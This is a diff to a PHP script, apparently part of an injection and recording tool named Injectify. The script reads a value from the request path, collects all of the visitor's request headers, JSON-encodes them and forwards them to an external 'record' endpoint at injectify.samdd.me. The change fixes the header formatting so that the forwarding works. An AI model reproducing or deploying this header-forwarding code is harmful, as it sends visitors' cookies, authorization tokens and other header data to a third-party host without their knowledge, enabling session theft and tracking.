@@ -32,13 +32,15 @@
         $base64 = explode("/", $_SERVER['REQUEST_URI']);
         $base64 = $base64[count($base64) - 1];
     }
-    $opts = array('http' =>
-        array(
-            'method'  => 'GET',
-            'header'  => 'Forwarded-Headers=' . urlencode(json_encode(getallheaders()))
-        )
-    );
-    $context      = stream_context_create($opts);
+
+    $opts = [
+        "http" => [
+            "method" => "GET",
+            "header" => "forwarded-headers: " . urlencode(json_encode(getallheaders())) . "\r\n"
+        ]
+    ];
+
+    $context = stream_context_create($opts);
     $injectifyURL = "http://injectify.samdd.me/record/" . $base64;
     $response     = file_get_contents($injectifyURL, false, $context);
 
